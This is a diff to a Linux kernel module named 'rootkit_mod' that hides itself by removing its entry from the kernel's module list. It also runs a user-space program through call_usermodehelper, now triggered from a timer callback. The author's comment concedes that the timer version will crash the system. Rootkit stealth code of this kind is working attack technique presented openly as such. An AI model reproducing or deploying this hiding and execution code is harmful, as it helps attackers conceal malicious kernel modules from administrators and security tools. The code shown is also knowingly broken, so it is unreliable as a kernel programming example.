@@ -13,6 +13,8 @@ MODULE_LICENSE("GPL");
 MODULE_AUTHOR("gotoc");
 MODULE_DESCRIPTION("Example module");
 
+static struct timer_list my_timer;
+
 /*
   Simple user space runner
 */
@@ -27,22 +29,46 @@ static int simple_usp_runner(void)
   return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
 }
 
+/*
+  Warrning! This is how to don't write kernel code
+  when simple USP will be run it will crash system because 
+  call_usermodehelper should have context, but timer callback 
+  doesn't have it.
+*/
+void rootkit_callback(unsigned long data)
+{
+  printk(KERN_INFO "rootkit_callback (%ld).\n", jiffies);
+
+  simple_usp_runner();
+}
+
 static int __init rootkit_init(void)
 {
+  int ret;  
   struct module *mod = THIS_MODULE;
-  printk(KERN_INFO "rootkit_mod loading.\n");
+  
+  printk(KERN_INFO "rootkit_mod setting up the timer.\n");
+
+/*
+  Lets setup simple timer. Timer resolution depends on kernel parameters
+  but don't dream about anything better than 1Hz.
+*/
+  setup_timer(&my_timer, rootkit_callback, 0);
+  ret = mod_timer(&my_timer, jiffies + msecs_to_jiffies(1000));
+
+  if (ret)
+    printk(KERN_WARNING "Error in mod_timer\n");
 
   printk(KERN_INFO "rootkit_mod hidind itself.\n");
-/* Based at: kernel/module.c
-   The mutex is because of risk another referencing to list.
-   in kernel/module.c each list_del operation are in mutex
- */
+/* 
+  Based at: kernel/module.c
+  The mutex is because of risk another referencing to list.
+  in kernel/module.c each list_del operation are in mutex
+*/
   mutex_lock(&module_mutex);
   list_del(&mod->list);
   mutex_unlock(&module_mutex);
 
-  msleep(1000);
-  simple_usp_runner();
 
   printk(KERN_INFO "rootkit_mod done.\n");
   return 0;
